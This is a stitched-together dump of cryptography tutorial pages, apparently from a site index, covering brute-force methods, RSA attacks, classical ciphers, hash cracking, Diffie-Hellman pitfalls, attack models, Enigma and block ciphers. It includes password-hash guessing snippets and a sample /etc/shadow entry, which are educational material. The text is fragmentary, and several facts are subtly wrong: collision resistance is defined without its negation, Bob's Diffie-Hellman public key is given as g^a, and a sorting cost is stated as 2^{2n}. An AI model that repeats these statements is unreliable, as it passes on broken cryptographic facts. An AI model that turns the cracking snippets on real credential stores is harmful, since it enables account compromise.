    "c": "Brute force  A brute force attack is a golden oldie, today still widely used and remains highly effective. Attackers use brute force attacks to: Crack passwords Decrypt encrypted data Gain access to unauthorised systems, websites or networks For example, public and private keys are used for encrypting and decrypting the data in a cryptographic system. In a brute force attack, possible private keys are used to decipher an encrypted message or data. The algorithm must be known, and is usually found as open-source programs. Types of attacks  In a simple brute force attack , an attacker tries to crack a small number of possible simple passwords or keys quickly. These attacks are only effective against systems with weak passwords or simple password policies. Simple passwords are guessed with common expressions like password and p4ssw0rd! . These attacks can be done manually or use automation and scripts. Automated attacks are also more likely to be detected and blocked by security systems. In a dictionary attack an attacker tries different possible passwords with a pre-arranged list of words, typically taken from a dictionary, against a username. A program is used to try different combinations of words and phrases. Used are unabridged or special dictionaries, augmented with numbers and special characters, and dictionaries of passwords that have been leaked by earlier data breaches. These attacks can be effective in contexts where people choose passwords that are simply words or phrases. Rainbow tables are the precomputed tables containing the hash values used to crack passwords. In a rainbow table attack an attacker tries to crack hashes of passwords that have been hashed using a variety of hashing algorithms, including MD5, SHA-1, and NTLM. Attackers can quickly look up the corresponding plaintext for a given hash without executing the computationally intensive process of hashing all possible plaintexts and comparing the result with the target hash. In brute force attacks the attackers do not know the password. In a reverse brute force attack the attacker knows the PIN or password, and tries to find the matching username. Usually, an attacker uses passwords leaked by earlier data breaches that can be found and/or bought online. In a hybrid brute force attack , an attacker combines a dictionary attack with a traditional brute force attack. The attacker will use a set of random characters and a program to try a list of common words and phrases. It allows the attacker to try both common and less common password options. In a credential stuffing attack an attacker uses a stolen (or bought) list of username and password pairs against various sites. These attacks can go undetected for a long time, as legitimate login credentials are used. In a password spraying attack one common password is applied to many accounts. These attacks are often successful as many people use the same password for multiple accounts. In a brute force attack on RDP connections an attacker tries to correctly guess the password to a remote desktop protocol (RDP) connection. If attackers can correctly guess the password, they can spread laterally throughout the network, injecting malware. Physical attack  Physical attacks can vary from blackmail to abduction. And are increasingly common, as James Lopps Known Physical Bitcoin Attacks repository attests to. Remediation  Use strong, unique passwords that are not based on words or phrases in a dictionary. Enable multifactor authentication (MFA). Keep track of login activities, like the number of failed login attempts and the failed IP addresses of users and locations.

    "c": "RSA puzzling  RSA encryption is an asymmetric algorithm that uses very large integers as both keys and messages, and the modular exponentiation as the primary mathematical operator for encryption and decryption. The algorithm is simple to understand and relatively easy to implement : Key generation Key distribution Encryption Decryption Message encryption is done with a Public Key , and message decryption is done with a Private Key – parameters ( \\(p\\) , \\(q\\) , \\(d\\) ) generated together with the Public Key . The private key is known only to the user, and the public key can be made known to anyone who wishes to send an encrypted message to the person with the corresponding private key. Key generation  To generate an RSA key pair : Pick two primes \\(p\\) and \\(q\\) Using \\(p\\) and \\(q\\) , calculate modulus \\(n = p × q\\) and its Euler’s totient \\(ϕ(n) = (p−1) × (q−1)\\) Choose the public exponent \\(e\\) with \\(gcd(e,ϕ(n)) = 1\\) sing the Extended Euclidean algorithm, compute the invert \\(d\\) of \\(e \\mod n\\) : \\(d ≡ e^{−1} \\mod (ϕ(n))\\) , which is the private exponent. Public key: \\(n, e\\) Private key: \\(n, d\\) Choose a message \\(m\\) to convert into integers Encrypt this plaintext \\(m\\) and receive a ciphertext \\(c ≡ m^e \\mod n\\) Decrypt a ciphertext \\(c\\) with \\(m ≡ c^d \\mod n\\) Trapdoor function  All public-key systems are based on the concept of trapdoor functions, simple to compute in one direction and computationally hard to reverse without knowledge of some special information called the trapdoor. In RSA, the trapdoor function is based on the hardness of factoring integers. Except in certain cases, there exists no efficient algorithm for factoring huge integers. The RSA trapdoor permutation is the core algorithm behind RSA-based encryption and signatures. Given a modulus \\(n\\) and number \\(e\\) , the public exponent, the RSA trapdoor permutation transforms a number \\(x\\) from the set \\(Z_n^*\\) into a number $y = x^e \\mod (n). When using the RSA trapdoor permutation to encrypt, the modulus \\(n\\) and the exponent \\(e\\) make up the RSA public key. In order to get \\(x\\) back from \\(y\\) , \\(d\\) is used: (1)  \\[\\begin{align} y^d \\mod n = (x^e)^d \\mod n = x^{ed} \\mod n = x \\end{align}\\] Because \\(d\\) is the trapdoor that allows decryption, it is part of the private key in the RSA key pair, and, unlike the public key, should always be kept secret. It is also called the secret exponent. \\(d\\) is not just any number; it is the number such that \\(e\\) multiplied by \\(d\\) is equivalent to 1, and therefore such that \\(x^{ed} \\mod n = x\\) for any \\(x\\) . We must have \\(ed = 1 \\mod φ(n)\\) in order to get \\(x^{ed} = x 1 = x\\) and to decrypt the message correctly. It is necessary to compute \\(modulo φ(n)\\) and not \\(modulo n\\) because exponents behave like the indexes of elements of \\(Z^n\\) rather than as the elements themselves. Because \\(Z^n\\) has \\(φ(n)\\) elements, the index must be less than \\(φ(n)\\) . Finding \\(φ(n)\\) for an RSA modulus n is equivalent to breaking RSA, because the secret exponent \\(d\\) can easily be derived from \\(φ(n)\\) and \\(e\\) , by computing \\(e\\) ’s inverse. Therefore, \\(p\\) and \\(q\\) must also be kept secret, since knowing \\(p\\) or \\(q\\) gives \\(φ(n)\\) by computing \\((p-1)(q-1) = φ(n)\\) . Elementary attacks  These include short message attacks in which an attacker knows some blocks of plaintext and tries to decode cipher text with the help of that; cycling attacks, in which the attacker thinks that the cipher text has been generated by using some permutation and uses all possible permutations of plain text to decipher the cipher text by ‘cycling’ the permutations; attacks in which an attacker uses the Extended Euclidean Algorithm to retrieve the plaintext based on ciphertext; and sometimes it happens that the plain text is the same as the cipher text after encryption. And if an attacker is able to know \\(p\\) and \\(q\\) using \\(n\\) , then it is possible to figure out the value of the private key. Common modulus  To avoid generating a different modulus \\(n\\) for each user, one may wish to fix \\(n\\) . The same \\(n\\) is used by all users. A trusted central authority could provide user \\(i\\) with a unique pair \\(e_i, d_i\\) from which user \\(i\\) forms a public key \\((n, e_i)\\) and a secret key \\((n, d_i)\\) . The resulting system is insecure. User Bob can use his own exponents \\(e_b, d_b\\) to factor the modulus \\(n\\) . Once \\(n\\) is factored Bob can recover Alice’s private key \\(d_a\\) from her public key \\(e_a\\) . Blinding  Let \\((n, d)\\) be Bob’s private key and \\((n, e)\\) his public key. Suppose Alice wants Bob’s signature on a message \\(m ∈ Z_n^∗\\) . Bob refuses to sign \\(m\\) . Marvin can try picking a random \\(r ∈ Z_n^∗\\) and sets \\(m' = r^e m \\mod n\\) and then asks Bob to sign the random message \\(m'\\) . Bob may be willing to provide his signature \\(s'\\) on the innocent-looking \\(m'\\) . Because \\(s' = (m')^d \\mod m\\) , Alice can now compute \\(s = s'/r \\mod n\\) and obtains Bob’s signature \\(s\\) on the original \\(m\\) . Low private exponent  If an attacker somehow guessed decryption key \\(d\\) , putting not only the ciphertext generated by encryption and the plaintext with corresponding encryption key in danger, also future messages are at risk. Wiener’s attack  Small value for \\(e\\) can lead to potential attacks known as attacks on the encryption key, such as Wiener’s attack on RSA with low private exponents. Wiener’s attack is an attack on RSA that uses continued fractions to find the private exponent \\(d\\) when it is small (less than \\(\\frac{1}{3} \\sqrt[4]{n}\\) ). We know that when picking the public exponent \\(e\\) to be a small number and calculating its inverse \\(d ≡ e^{−1} \\mod ϕ(n)\\) . Suppose we have the public key \\((n,e)\\) , this attack will determine \\(d\\) : Convert the fraction \\(\\frac{e}{n}\\) into a continued fraction \\([a_0;a_1,a_2,…,a_{k−2},a_{k−1},a_k]\\) . Iterate over each convergent in the continued fraction: (2)  \\[\\begin{align} \\frac{a_0}{1}, a_0 + \\frac{1}{a_1}, a_0 + \\frac{1}{a_1 + \\frac{1}{a_2}} ... , a_0 + \\frac{1}{a_1 + \\frac{1}{a_{k-2} + \\frac{1}{a_{k-1}}}} \\end{align}\\] Check if the convergent is \\(\\frac{k}{d}\\) by: Setting the numerator to be \\(k\\) and denominator to be \\(d\\) Check if \\(d\\) is odd, if not, move on to the next convergent Check if \\(ed ≡ 1 \\mod(k)\\) , if not, move on to the next convergent Set \\(ϕ(n) = \\frac{ed−1}{k}\\) and find the roots of the polynomial \\(x^2 − (n−ϕ(n)+1)x + n\\) If the roots of the polynomial are integers, then we’ve found \\(d\\) (If not, move on to the next convergent). If all convergents have been tried, and none of them work, then the given RSA parameters are not vulnerable to Wiener’s attack. Boneh-Durfee attack  The Boneh-Durfee attack is an extension of Wiener’s attack. That is, it also attacks on low private component \\(d\\) with a further relaxed condition. If \\(d\\) satisfies \\(d < n^{0.292}\\) , then it is possible to use the Boneh-Durfee attack to retrive \\(d\\) . Low public exponent  Coppersmith  The most powerful attacks on low public exponent RSA are based on the Coppersmith theorem . The theorem provides an algorithm for efficiently finding all roots of \\(f \\mod n\\) that are less than \\(x = n^{1/d}\\) . The algorithm’s running time decreases as \\(x\\) gets smaller. The strength of this theorem is its ability to find small roots of polynomials modulo a composite \\(n\\) .

    "c": "Classical ciphers  Classical ciphers are doomed to be insecure because they’re limited to operations you can do in our heads or on a piece of paper. They lack the computational power of a computer and are easily broken by simple computer programs. Caesar cipher  One of the most widely known historical encryption methods is the Caesar cipher. According to the Roman historian Gaius Suetonius Tranquillus (c. 70–130 CE), Julius Caesar used this cipher to encrypt military messages, shifting all letters of the plaintext three places to the right. Although the Caesar cipher is not useful for modern cryptographic needs, it does contain all the fundamental concepts needed for a cryptography algorithm A plaintext message An algorithm: shift every letter A key: for example +3 A ciphertext This is, essentially, the same structure used by all modern symmetric algorithms. Because there are only 26 letters in the English alphabet, the key space is 26 (in English). (1)  \\[\\begin{align} C\\equiv P \\oplus K\\mod(26) \\end{align}\\] The mathematical representation of Caesar’s method of shifting three to the right is: (2)  \\[\\begin{align} C\\equiv P \\oplus 3\\mod(26) \\end{align}\\] The Caesar cipher is super easy to break: to decrypt a given ciphertext, simply shift the letters three positions back to retrieve the plaintext. The Caesar cipher may have been strong enough during the time of Crassus and Cicero because no secret key was involved (it is always 3), and it was assumed attackers were illiterate or too uneducated to figure it out. This assumption no longer holds true. The Caesar cipher can be made more secure by using a variable secret shift value instead of always using 3, but that does not help much because an attacker could easily try all 25 possible shift values until the decrypted message makes sense. The Vigenère cipher   1500 years later, in 1553, a meaningful improvement of the Caesar cipher appeared in the form of the Vigenère cipher , created in the 16th century by Giovan Battista Bellaso. The name Vigenère comes from Blaise de Vigenère, who invented a different cipher in the 16th century, but due to historical misattribution, Vigenère’s name stuck. The Vigenère cipher is a method of encrypting alphabetic text by using a series of different mono-alphabet ciphers selected based on the letters of a keyword. Bellaso also added the concept of using any keyword, thereby making the choice of substitution alphabets difficult to calculate. The Vigenère cipher became favoured and was used during the American Civil War by Confederate forces and during WWI by the Swiss Army, among others. For many years, Vigenère was considered very strong, even unbreakable. In the nineteenth century, Friedrich Kasiski published a technique for breaking the Vigenère cipher. The math for Vigenère looks very similar to that of Caesar, with one important difference: the value \\(K\\) changes: (3)  \\[\\begin{align} C_i\\equiv P_i \\oplus K_i\\mod(26) \\end{align}\\] The \\(i\\) denotes the current key with the current letter of plaintext and the current letter of ciphertext. Many sources use \\(M\\) (for message) rather than \\(P\\) (for plaintext) in this notation. IOW, it is similar to the Caesar cipher, except that letters aren’t shifted by three places but rather by values defined by a key, a collection of letters that represent numbers based on their position in the alphabet. For example, if the key is DUH, letters in the plaintext are shifted using the values 3, 20, 7 because D is three letters after A, U is 20 letters after A, and H is seven letters after A. The 3, 20, 7 pattern repeats until the entire plaintext is encrypted. The Vigenère cipher is clearly more secure than the Caesar cipher, yet it’s still fairly easy to break : The first step to breaking it is to figure out the key’s length. If in the ciphertext a group of letters appears often, this gives clues about the key length. If for example a group of three letters (WBL) appears twice in a ciphertext at nine-letter intervals, this suggests that the same three-letter word was encrypted using the same shift values, producing WBL each time. A cryptanalyst can then deduce that the key’s length is either nine or a value divisible by nine (that is, three). The second step to breaking the Vigenère cipher is to determine the actual key using a method called frequency analysis, which exploits the uneven distribution of letters in languages. For example, in English, E is the most common letter, so if you find that X is the most common letter in a ciphertext, then the most likely plaintext value at this position is E. Breaking ciphers  Trying to figure out the workings of a cipher, first identify its two main components: its permutation and a mode of operation. A permutation is a function that transforms an item (a letter or a group of bits) such that each item has a unique inverse. Most classical ciphers work by replacing each letter with another letter. In the Caesar and Vigenère ciphers, the substitution is a shift in the alphabet. The alphabet or set of symbols can vary: it could be the Arabic alphabet; instead of letters, it could be words, numbers, or ideograms, etc. To be secure, a cipher’s permutation should satisfy three criteria: The permutation should be determined by the key, to keep the permutation secret as long as the key is secret. In the Vigenère cipher, if you don’t know the key, you don’t know which of the 26 permutations was used; that makes it harder to decrypt. Different keys should result in different permutations. If not, it becomes easier to decrypt without the key: if different keys result in the same permutations, there are fewer distinct keys than distinct permutations, and therefore fewer possibilities to try when decrypting without the key. The permutation should look random: patterns make a permutation predictable for an attacker, and therefore less secure. A mode of operation is an algorithm that uses a permutation to process messages of arbitrary size. It mitigates the exposure of duplicate letters in the plaintext by using different permutations for duplicate letters. The mode of the Caesar cipher repeats the same permutation for each letter, and in the Vigenère cipher letters at different positions undergo different permutations: if the key is N letters long, then N different permutations will be used for every N consecutive letters. This can still result in patterns in the ciphertext because every Nth letter of the message uses the same permutation. That’s why frequency analysis works to break the Vigenère cipher. Frequency analysis can be defeated if the Vigenère cipher only encrypts plaintexts that are of the same length as the key. In which case, another problem appears: reusing the same key several times exposes similarities between plaintexts. For example, with the key KYN, the words TIE and PIE encrypt to DGR and ZGR, respectively. Both end with the same two letters (GR), revealing that both plaintexts share their last two letters as well. Finding these patterns shouldn’t be possible with a secure cipher. To build a secure cipher, combine a secure permutation with a secure mode. Ideally, this combination prevents attackers from learning anything about a message other than its length. One-Time Pad  A classical cipher can not be secure unless it comes with a huge key, and encrypting with a huge key is impractical. The one-time pad is such a cipher, and it is the most secure cipher. The one-time pad takes a plaintext, \\(P\\) , and a random key, \\(K\\) , that is the same length as \\(P\\) and produces a ciphertext \\(C\\) , defined as (4)  \\[\\begin{align} C\\equiv P \\oplus K \\end{align}\\] where \\(C\\) , \\(P\\) , and \\(K\\) are bit strings of the same length and where ⊕ is the bitwise exclusive OR operation ( XOR ), defined as \\(0 ⊕ 0 = 0\\) , \\(0 ⊕ 1 = 1\\) , \\(1 ⊕ 0 = 1\\) , and \\(1 ⊕ 1 = 0\\) .

    "c": "Hacking hashes  Hash functions, like MD5, SHA-1, SHA-256, SHA-3, and BLAKE2, are used in digital signatures, public-key encryption, integrity verification, message authentication, password protection, key agreement protocols, and many other cryptographic protocols. Security goals  Hash functions in applied cryptography are constructions that were originally defined to provide three specific security properties: Pre-image resistance ensures that no one should be able to reverse the hash function in order to recover the input given an output. Second pre-image resistance: if I give you an input and the digest it hashes to, you should not be able to find a different input that hashes to the same digest. Collision resistance: one should be able to produce two different inputs that hash to the same output. This definition has changed over time, and are often meaningless on their own; it all depends on how the hash function is used. In addition, hash functions are usually designed so that their digests are unpredictable and random. This is useful because one cannot always prove a protocol to be secure. Many protocols are instead proven in the random oracle model, where a fictional and ideal participant called a random oracle is used. In this type of protocol, one can send any inputs as requests to that random oracle, which is said to return completely random outputs in response, and like a hash function, giving it the same input twice returns the same output twice. Proofs in this model are sometimes controversial as we do not know for sure if we can replace these random oracles with real hash functions (in practice). Yet, many legitimate protocols are proven secure using this method, where hash functions are seen as more ideal than they probably are. Finding collisions  Naive birthday attack  Compute \\(2^{n/2}\\) hashes of \\(2^{n/2}\\) arbitrarily chosen messages and store all the message/hash pairs in a list. Sort the list with respect to the hash value to move any identical hash values next to each other. Search the sorted list to find two consecutive entries with the same hash value. This method requires a lot of memory (storing \\(2^{n/2}\\) message/hash pairs), and sorting lots of elements slows down the search, requiring about \\(2^{2n}\\) basic operations on average using even the quicksort algorithm. The Rho method  The Rho method is an algorithm for finding collisions that, unlike the naive birthday attack, requires only a small amount of memory: Given a hash function with \\(n\\) -bit hash values, pick some random hash value ( \\(H_1\\) ), and define \\(H_1 = H'_1\\) . Compute \\(H_2 = Hash(H_1)\\) , and \\(H'_2 = Hash(Hash(H'_1))\\) ; that is, in the first case apply the hash function once, and in the second case twice. Iterate the process and compute \\(H_i + 1 = Hash(H_i)\\) , \\(H'_i + 1 = Hash(Hash(H'_i))\\) , until you reach \\(i\\) such that \\(H_i + 1 = H'_i + 1\\) . Advanced collision-finding techniques work by first detecting the start of the cycle and then finding the collision, without storing numerous values in memory and without needing to sort a long list. Cracking hashes  Having the hash value of something, and wanting to calculate the data it came from, in general, there is no unique solution. For short objects like passwords, there is. If someone uses an MD5 function to obscure a password (done by some old web applications still existing in the wild), then you can reverse it by guessing passwords until finding a match. There is no mathematical way to undo a hash function, so the best way is to make (or use) a library. Windows passwords  The hash used by, for example, Windows Server is the NT Hash. If two users have the same password, they have exactly the same hash. The algorithm Microsoft uses takes the password and encodes in Unicode instead of ASCII, to allow for passwords in languages such as Chinese and Japanese that do not encode with 8-bits per character but 16-bits per character. Then it is run through MD4 (an algorithm even older than MD5) to produce the NT hash value. Because password hashes have no variation and any two users with the same password will have the same hash, all the hackers that had cracked wordlists for the last decades have put their results on the internet. For example, you can use the crackstation or hashes.com . This availability has even resulted in a situation where you can just Google frequently used password hashes. When the passwords cannot be cracked, you can try guessing using hashlib . Make series of guesses (or use a passwordlist), hash them, and hunt for the answer. import hashlib hashlib.new(\"md4\", \"password\".encode(\"utf-16le\")).hexdigest() Linux password hashes  In Linux, the hashes can be found in the /etc/shadow file. username:$6$ligE06T/QLQMANm9$8GDajwZJahwNnnW/OtfwLUGZHYcmTd9RByNz2e32iJAx37fSu7R1mpxTwWOqwlc4etyR/SLBkfiksitUHXRVV.:18961:0:99999:7::: After each username comes $6 , which indicates it is a type 6 password, then there is a random string of characters that goes up to the next dollar sign, the salt, and then an even longer random string of characters, which is the actual password hash itself. When users have the same password, they have completely different hashes, because a random salt is added before hashing them, to obscure the fact that these passwords are the same. Besides salting, stretching is also used. Calculating the hash uses 5,000 rounds of SHA-512, which takes much more CPU time. This might slow down attackers trying to make dictionaries of password hashes. Make series of guesses (or use a wordlist for a dictionary attack), hash them, and hunt for an answer. from passlib.hash import sha512_crypt sha512_crypt.using(salt=\"ligE06T/QLQMANm9\", rounds=5000).hash(\"password\") This will be very, very, time-consuming.

However, this weakness pales in comparison to some others, which can cause total compromise in seemingly secure hash functions. Resources  Collisions of MD5 rfc1321",

Once communicating parties have established a shared secret value with the DH protocol, that secret can be used to establish a secure channel by turning the secret into one or more symmetric keys that are then used to encrypt and authenticate subsequent communication. The DH protocol (and its variants) are therefore called key agreement protocols. Choose a prime \\(p\\) and a generator \\(g ∈ \\mathbb{F}_p\\) Alice picks a private key \\(a ∈ \\mathbb{Z}_{p−1}\\) Bob picks a private key \\(b ∈ \\mathbb{Z}_{p−1}\\) Alice’s public key is \\(g^a \\mod p\\) Bob’s public key is \\(g^a \\mod p\\) Their shared key is \\(g^{ab} ≡ (g^a)^b ≡ (g^b)^a \\mod p\\) Diffie–Hellman’s simplicity can be deceiving. For one thing, it won’t work with just any prime \\(p\\) or base number \\(g\\) . For example, some values of \\(g\\) will restrict the shared secrets \\(g^{ab}\\) to a small subset of possible values, whereas you’d expect to have about as many possible values as elements in \\(\\mathbb{Z}_p^*\\) , and therefore as many possible values for the shared secret. To ensure the highest security, safe DH parameters should work with a prime \\(p\\) such that \\((p – 1) / 2\\) is also prime. Such a safe prime guarantees that the group does not have small subgroups that would make DH easier to break. The dhparam command of the OpenSSL toolkit will only generate safe DH parameters, but the extra checks built into the algorithm result increase the execution time considerably. What can possibly go wrong?  Diffie–Hellman protocols can fail spectacularly in a variety of ways. Not hashing the shared secret Using legacy Diffie–Hellman: The TLS protocol is the security behind HTTPS secure websites as well as the secure mail transfer protocol (SMTP). TLS takes several parameters, including the type of Diffie–Hellman protocol it will use, though most TLS implementations still support anonymous DH for legacy reasons, despite its insecurity. Unsafe group parameters: In January 2016, the maintainers of the OpenSSL toolkit fixed a high-severity vulnerability ( CVE-2016-0701 ) that allowed an attacker to exploit unsafe Diffie–Hellman parameters. The root cause of the vulnerability was that OpenSSL allowed users to work with unsafe DH group parameters (namely, an unsafe prime p) instead of throwing an error and aborting the protocol altogether before performing any arithmetic operation.",

    "c": "Attack models  A cipher is secure if, even given a large number of plaintext–ciphertext pairs, nothing can be learned about the cipher’s behavior when applied to other plaintexts or ciphertexts. How does an attacker come by these pairs? How large is a “large number”? Attack models are assumptions about what an attacker can and cannot do. Black-box models  These are some useful attack models expressed in terms of what an attacker can observe and what queries they can make to the cipher. An encryption query, for example, takes a plaintext and returns a corresponding ciphertext, without revealing the secret key. Ciphertext-only  Ciphertext-only attack (COA) is a type of attack model in which the attacker only knows the ciphertext and has no knowledge of the associated plaintext, and don’t know how the plaintexts were selected. Attackers in the COA model are passive and can’t perform encryption or decryption queries. In the history of cryptography, early ciphers, implemented using pen-and-paper, were routinely broken using ciphertexts alone. In this attack model, the attacker gains access to a collection of ciphertext. Although the plaintext can still not be read, it is theoretically possible to determine the ciphertext from the collection. On occasion, it works. A one time pad (OTP) can not be broken because there are many answers (that make sense) given a specific ciphertext, so there is no way to know the intended plaintext. In practice, an attacker usually has at least some knowledge of the plaintext, like the set of characters used or the language used. Known-plaintext  In known-plaintext attacks (KPA), an attacker has access to the ciphertexts and its corresponding plaintexts. Attackers in the KPA model thus have a list of plaintext–ciphertext pairs, where plaintexts are assumed to be randomly selected. KPA is a passive attacker model. The goal is to guess the secret key (or a number of secret keys), or to develop an algorithm which would allow for decrypting further messages. The attacker can not actively change the data or secret keys to be processed by the cipher. This type of attack is useful when finding or knowing the plaintext of some portions of the ciphertext using information gathering techniques. For example, known-plaintext attacks were used for attacking the ciphers used during the Second World War, like the attacks on German Enigma ciphers. The English intelligence targeted some common phrases, commonly appearing in encrypted German messages, like weather forecasts or geographical names. The ancient and simple XOR cipher of the early digital days, can also easily be broken by knowing only some parts of plaintext and corresponding encrypted messages. Modern ciphers are generally resistant against purely known-plaintext attacks, save for the old encryption method used in the PKZIP application . Having just one copy of encrypted file, together with its original version, it was possible to completely recover the secret key. Chosen-plaintext  In a chosen-plaintext attack (CPA), an adversary can (possibly adaptively) ask for the ciphertexts of arbitrary plaintext messages. This is formalised by allowing the adversary to interact with an encryption oracle, viewed as a black box. Unlike COA or KPA, which are passive models, CPA are active attackers, because they influence the encryption processes rather than passively eavesdropping. The goal is to reveal all or part of the secret encryption key: Choose a set of plaintexts and submit once to the oracle (batch chosen-plaintext attack) Choose a smaller one, receive its encrypted ciphertext and then based on the answer, choose another one (when having the capability to choose plaintext for encryption many times and instead of using one big block of text) (adaptive chosen plaintext attack) It may seem infeasible in practice that an attacker could obtain ciphertexts for given plaintexts, but modern cryptography is implemented in software or hardware and is used in a diverse range of applications, making it very feasible. Chosen-plaintext attacks become extremely important in the context of public key cryptography, where the encryption key is public and attackers can encrypt any plaintext they choose. Chosen-plaintext attacks are often used to break symmetric encryption. Thus, it is important for symmetric cipher implementers to understand how an attacker would attempt to break their cipher (and make improvements based on that). For some chosen-plaintext attacks, only a small part of the plaintext may need to be chosen by the attacker; such attacks are known as plaintext injection attacks. Oracles  A cryptographic oracle is a mathematical description of a data leak, to be used in security proofs. Given access to such an oracle, it is possible to rebuild the private key. For example, in the old (1999) case of RSA, it meant that knowing whether a value has a proper padding or not is equivalent to learning the private key (after a million or so tries). The Bleichenbacher’s attack showed that it also works the other way round. In cryptographic papers oracles are often used to show that, even if adversaries would have access to an oracle, they still wouldn’t have any (significant) advantage for breaking security. For example, one important property of encryption algorithms (called resistance to known plaintext attacks) is that if an attacker is given a message encrypted with a key m' and they want to know the original message m (or figure out the key), then giving them another message n and its encryption with a key n' should not help them do so. Chosen ciphertext  In a chosen-ciphertext attack (CCA), an adversary can analyse chosen ciphertexts together with their corresponding plaintexts to acquire a secret key or to get as much information about the system as possible. In this attack, the adversary is assumed to have a way to trick someone who knows the secret key into decrypting arbitrary message blocks and send back the result. The attacker can choose some arbitrary nonsense as an encrypted message and ask to see the (usually) different nonsense it decrypts to, and can do this a number of times. The goal of the adversary is deducing what the secret key is. Replace or modify a ciphertext to be sent on a device. Eavesdrops on the communications. Work out what the receiver read when he/she decrypted the fake ciphertext. Chosen-ciphertext attacks are usually used for breaking systems with public key encryption. Early versions of the RSA cipher were vulnerable to such attacks. They are hardly used for attacking systems protected by symmetric ciphers, but some self-synchronising stream ciphers can also be attacked successfully. An adaptive chosen-ciphertext attack (CCA2) is an interactive form of chosen-ciphertext attack in which an adversary first sends a number of ciphertexts to be decrypted chosen adaptively, then uses the results to distinguish a target ciphertext without consulting the encryption oracle on the challenge ciphertext. There exist rather few practical adaptive-chosen-ciphertext attacks. This model is mostly used for analysing the security of a given system. Proving that this attack doesn’t break the security confirms that any realistic chosen-ciphertext attack is unlikely to succeed. In an adaptive attack the attacker is allowed adaptive queries after the target is revealed (but the target query is disallowed). In an indifferent (non-adaptive) chosen-ciphertext attack (CCA1), the second stage of adaptive queries is not allowed. Gray-box models  In a gray-box model, the attacker has access to a cipher’s implementation. This makes gray-box models more realistic than black-box models for applications such as smart cards, embedded systems, and virtualized systems, to which attackers often have physical access and can thus tamper with the algorithms’ internals. Gray-box models are more difficult to define than black-box ones because they depend on physical, analog properties rather...",

POHHDOTQDJFAU SW HIN DPYE The password is in UPPERCASE. Enigma  The Enigma is a family of machines. The first version was invented by German engineer Arthur Scherbius toward the end of World War I. It was also used by several militaries, not just the Nazi Germans. Some military texts encrypted using a version of Enigma were broken by Polish cryptanalysts: Marrian Rejewsky, Jerzy Rozycki, and Henry Zygalski. The three basically reverse engineered a working Enigma machine. The team then developed tools for breaking Enigma ciphers, including one tool named the cryptologic bomb. The core of the Enigma machine was the rotors. These were disks that were arranged in a circle with 26 letters on them. The rotors where lined up. Essentially each rotor represented a different single substitution cipher. Think of the Enigma as a sort of mechanical poly-alphabet cipher. The operator of the Enigma machine would be given a message in plaintext, then type that message into Enigma. For each letter that was typed in, Enigma would provide a different ciphertext based on a different substitution alphabet. The recipient would type in the ciphertext, getting out the plaintext, provided both Enigma machines had the same rotor settings. There were several Enigma models: Enigma A, the first public Enigma Enigma B Enigma C Enigma B, used by the United Kingdom, Japan, Sweden, and others Navy Cipher D used by the Italian Navy Funkschlüssel C, used by the German navy beginning in 1926 Enigma G used by the German Army Wehrmacht Enigma I, a modification of the Enigma G. Used extensively by the German Military M3, an improved Enigma introduced in 1930 for the German military There have been many systems either derived from Enigma, or similar in concept. These include the Japanese system codenamed GREEN by American cryptographers, the SIGABA system, NEMA, and others. Resources  DCode: Enigma Machine",

    "t": "Block ciphers ",
    "c": "Block ciphers  A block cipher consists of an encryption algorithm and a decryption algorithm: The encryption algorithm (E) takes a key, \\(K\\) , and a plaintext block, \\(P\\) , and produces a ciphertext block, \\(C\\) : \\(C = E(K, P)\\) . The decryption algorithm (D) is the inverse of the encryption algorithm and decrypts a message to the original plaintext, \\(P\\) : \\(P = D(K, C)\\) . Since they are the inverse of each other, the encryption and decryption algorithms usually involve similar operations. Security goals  In order for a block cipher to be secure, it should be a pseudorandom permutation (PRP), meaning that as long as the key is secret, an attacker shouldn’t be able to compute an output of the block cipher from any input. IOW, as long as \\(K\\) is secret and random from an attacker’s perspective, they should have no clue about what \\(E(K, P)\\) looks like, for any given \\(P\\) . Codebook attack  Two values characterize a block cipher: the block size and the key size. While blocks shouldn’t be too large, they also shouldn’t be too small; otherwise, they may be susceptible to codebook attacks, which are attacks against block ciphers that are only efficient when smaller blocks are used. The codebook attack works like this with 16-bit blocks: Get the 65536 ( \\(2^{16}\\) ) ciphertexts corresponding to each 16-bit plaintext block. Build a lookup table—the codebook—mapping each ciphertext block to its corresponding plaintext block. To decrypt an unknown ciphertext block, look up its corresponding plaintext block in the table. Slide attack and round keys  Computing a block cipher means computing a sequence of rounds. In a block cipher, a round is a basic transformation that is simple to specify and to implement, and which is iterated several times to form the block cipher’s algorithm. The round functions are usually identical algorithms, but they are parameterized by a value called the round key. Two round functions with two distinct round keys will behave differently, and therefore will produce distinct outputs if fed with the same input. Round keys are keys derived from the main key, \\(K\\) , using an algorithm called a key schedule. Slide attacks look for two plaintext/ciphertext pairs \\((P_1, C_1)\\) and \\((P_2, C_2)\\) , where \\(P_2 = R(P_1)\\) if \\(R\\) is the cipher’s round. One potential byproduct and benefit of using round keys is protection against side-channel attacks, or attacks that exploit information leaked from the implementation of a cipher. If the transformation from the main key, \\(K\\) , to a round key, \\(K_i\\) , is not invertible, then if an attacker finds \\(K_i\\) , they can’t use that key to find \\(K\\) . Unfortunately, few block ciphers have a one-way key schedule. The key schedule of AES allows attackers to compute \\(K\\) from any round key, \\(K_i\\) . Substitution–Permutation networks  In the design of a block cipher, confusion and diffusion take the form of substitution and permutation operations, which are combined within substitution–permutation networks (SPNs). Substitution often appears in the form of S-boxes, or substitution boxes, which are small lookup tables that transform chunks of 4 or 8 bits. S-boxes must be carefully chosen to be cryptographically strong: they should be as nonlinear as possible (inputs and outputs should be related with complex equations) and have no statistical bias (meaning, for example, that flipping an input bit should potentially affect any of the output bits). The permutation in a substitution–permutation network can be as simple as changing the order of the bits, which is easy to implement but does not mix up the bits very much. Instead of a reordering of the bits, some ciphers use basic linear algebra and matrix multiplications to mix up the bits. Security  There are two must-know attacks on block ciphers: meet-in-the-middle attacks, a technique discovered in the 1970s but still used in many cryptanalytic attacks (not to be confused with man-in-the-middle attacks), and padding oracle attacks, a class of attacks discovered in 2002 by academic cryptographers, then mostly ignored, and finally rediscovered a decade later along with several vulnerable applications.

    "t": "Portable Executable (PE) format ",
